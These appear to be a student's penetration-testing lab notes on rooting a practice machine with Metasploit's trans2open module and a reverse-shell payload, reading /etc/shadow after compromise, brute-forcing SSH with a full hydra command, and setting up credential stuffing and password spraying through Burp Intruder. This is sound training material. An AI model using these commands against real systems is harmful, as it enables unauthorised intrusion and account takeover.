exploitation
========================
# gaining root with metasploit

* search trans2open
* use 1 (linux trans2open)
* options
* set rhosts 10.0.2.4
* show targets
* exploit

notice, this doesnt work, all our terminals are dying! we needed to change the payload from non-staged to staged

* set payload linux/x86/shell_reverse_tcp

![qownnotes-media-yrGHqS](media/qownnotes-media-yrGHqS.png)


# manual exploitation

downloaded OpenFuck > compiled it > ran it and found shi

things we can do on a rooted machine:
* whoami
* hostname
* cat /etc/passwd
* cat /etc/shadow
* ifconfig, ip a, arp, route
    * if we find other networks we can *pivot* to them
* sudo -L to see what users we can transfer to

# bruteforce attacks

hydra: SSH bruteforce tool

`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.4:22 -t 4 -V`

* -l: the user we want to attack
* -P: specify a list
* ssh://10.0.2.4:22: ssh protocol, our target machine, ssh port (22)
* -t: number of threads
* -V: verbosity

doesnt work just like that (kex algo error in ssh), heres how it gets fixed:
* run `sudo kali-tweaks`
* Hardening
* in "wide compatibility mode", tick on ssh

similar to hydra, theres `auxiliary/scanner/ssh/ssh_login` in metasploit


# credential stuffing and password spraying

credential stuffing: injecting breached account credentials in hopes of account takeover

basically taking these breached passwords and throwing them at a login

foxyproxy

![qownnotes-media-hMLlFJ](media/qownnotes-media-hMLlFJ.png)

password spraying: using known usernames without a known password

we capture a query through a login form with the intercept (we can make a test login), right click on the line where the credentials are, and send to intruder